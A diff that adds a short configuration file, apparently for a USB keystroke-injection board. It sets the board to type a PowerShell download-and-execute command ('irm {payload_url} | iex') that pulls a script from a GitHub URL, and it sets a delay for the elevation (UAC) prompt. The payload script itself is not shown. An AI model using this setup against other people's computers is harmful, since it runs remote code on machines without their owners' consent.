@@ -1,0 +1,9 @@
+# true - use online mode and type `irm {payload_url} | iex` into powershell
+# false - use offline mode and type the payload.ps1 file line by line into powershell
+ONLINE_MODE=true
+
+# Will be ignored if ONLINE_MODE is set to false
+PAYLOAD_URL="https://raw.githubusercontent.com/DinastijaLab/goodUSB/refs/heads/main/code/payload.ps1"
+
+# How long the board waits when the UAC is supposed to pop up, it needs to be a STRING
+UAC_WAIT="1.5"
